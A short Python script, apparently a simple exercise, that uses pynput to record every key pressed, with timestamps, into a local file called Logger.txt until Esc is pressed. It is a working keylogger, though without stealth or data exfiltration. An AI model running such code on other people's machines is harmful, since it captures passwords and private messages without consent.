from pynput.keyboard import Key, Listener
from pynput.keyboard import Key, Controller
import logging


logging.basicConfig(filename="Logger.txt", level=logging.DEBUG, format= '%(asctime)s: %(message)s')


def on_press(key):
    logging.info(str(key))
    if key == Key.esc:
        return False

with Listener(on_press=on_press) as listener:
    listener.join()